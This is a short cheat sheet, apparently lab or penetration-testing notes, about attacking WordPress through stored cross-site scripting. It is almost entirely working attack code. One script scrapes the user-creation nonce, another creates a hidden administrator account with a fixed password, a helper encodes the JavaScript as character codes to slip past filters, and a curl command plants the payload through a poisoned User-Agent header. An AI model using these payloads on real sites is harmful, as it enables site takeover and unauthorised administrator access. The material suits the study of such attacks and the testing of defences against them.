# Wordpress


## Gathering WordPress Nonce

```js
var ajaxRequest = new XMLHttpRequest();
var requestURL = "/wp-admin/user-new.php";
var nonceRegex = /ser" value="([^"]*?)"/g;
ajaxRequest.open("GET", requestURL, false);
ajaxRequest.send();
var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
var nonce = nonceMatch[1];

```

## Creating a New WordPress Administrator Account

```js

var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=theattacker&email=theattacker@whatever.com&pass1=attackpass&pass2=attackpass&role=administrator";
ajaxRequest = new XMLHttpRequest();
ajaxRequest.open("POST", requestURL, true);
ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
ajaxRequest.send(params);


```

## JS Encoding JS Function

```js
function encode_to_javascript(string) {
      var input = string
      var output = '';
      for(pos = 0; pos < input.length; pos++) {
        output += input.charCodeAt(pos);
        if(pos != (input.length - 1)) {
          output += ",";
        }
      }
      return output;
    }
let encoded = encode_to_javascript('insert_minified_javascript')
console.log(encoded)
```

## Poisonning log file

```sh
curl -i http://offsecwp --user-agent "<script>eval(String.fromCharCode(118,...,59))</script>" --proxy 127.0.0.1:8080

```

https://shift8web.ca/2018/01/craft-xss-payload-create-admin-user-in-wordpress-user/